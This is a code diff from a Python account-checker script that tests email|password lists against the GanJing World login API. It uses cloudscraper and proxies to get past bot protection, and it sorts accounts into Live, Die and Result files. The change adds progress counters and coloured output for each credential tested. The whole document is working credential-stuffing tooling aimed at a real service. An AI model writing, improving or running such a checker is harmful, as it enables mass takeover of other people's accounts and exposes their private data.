@@ -443,7 +443,7 @@ def delete_video_shorts(account):
         except Exception as e:
             data_content.append(i)
 
-def check_acc(account):
+def check_acc(account, good, bad, total):
     email = account.split("|")[0]
     password = account.split("|")[1]
     scraper = cloudscraper.create_scraper()
@@ -479,6 +479,7 @@ def check_acc(account):
             continue
     if "The user does not exist" in a.text:
         open("Result.txt", "a", encoding="utf-8").write(f"{email}|{password}|Email doesnt exist\n")
+        print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Email doesnt exist") 
         return
     server_salt = a.json()["data"]["server_salt"]
     client_salt = a.json()["data"]["client_salt"]
@@ -518,8 +519,11 @@ def check_acc(account):
             a = scraper.post("https://gw.ganjingworld.com/v1.0c/signinpw", headers=h, json=d, proxies=p)
             if "Password is incorrect" in a.text:
                 open("Die.txt", "a", encoding="utf-8").write(f"{email}|{password}|Wrong password\n")
+                print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Wrong password")
+                return False
             user_id = a.json()["data"]["user_id"]
             open("Live.txt", "a", encoding="utf-8").write(f"{email}|{password}|Login success|https://www.ganjingworld.com/channel/{user_id}\n")
+            print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
             return True
         except Exception as e: 
             pass
